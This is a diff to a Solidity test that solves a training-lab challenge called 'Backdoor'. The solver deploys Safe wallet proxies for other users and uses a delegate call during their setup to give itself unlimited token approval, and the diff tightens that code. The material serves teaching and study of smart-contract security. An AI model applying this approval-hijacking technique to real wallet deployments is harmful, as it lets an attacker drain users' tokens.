@@ -72,7 +72,7 @@ contract BackdoorChallenge is Test {
     function test_backdoor() public checkSolvedByPlayer {
         // Steps to solve this challenge:
         // 1) Deploy ChallengeSolver contract as the one transaction by player
-        // (all following steps need to be preformed within ChallengeSolver constructor to stay under 1 transaction requirement)
+        // (All contract creations initiated by the player must be limited to one so the rest will be executed within the ChallengeSolver constructor)
         // 2) Deploy helper contract
         // 2) Deploy safe proxies for each user
         // 3) Use delegate call from within each safe contract setup to grant ourselves infinite approval on the DVT contact
@@ -175,6 +175,7 @@ contract ChallengeSolver {
 
     function _encodeSafeSetupCall(address[] memory owners)
         internal
+        pure
         returns (bytes memory initializerDataForSafeCreation)
     {
         // variables needed for initial Safe setup call
@@ -199,9 +200,16 @@ contract ChallengeSolver {
 
 // This needs to be it's own contract
 // If it was just another function on ChallengeSolver, then when the safe tried to delegate call, the safe contract would revert because the extcodesize check would still think ChallengeSolver had no code until after it's constructor finished running
+// Safe.setup requires `to` to be a deployed contract `(isContract(to))`, so the delegate call target cannot be the ChallengeSolver during it's constructor
 // This contract also has to be fully stateless since it will be delegate called, meaning it will be using the storage of the safe proxy so any reads/writes to state variables would be incorrect
 contract Approver {
+    error ApprovalFailed();
+
     function approveMe(address dvt, address addressToApprove) external {
-        dvt.call(abi.encodeWithSignature("approve(address,uint256)", addressToApprove, type(uint256).max));
+        (bool success,) =
+            dvt.call(abi.encodeWithSignature("approve(address,uint256)", addressToApprove, type(uint256).max));
+        if (!success) {
+            revert ApprovalFailed();
+        }
     }
 }
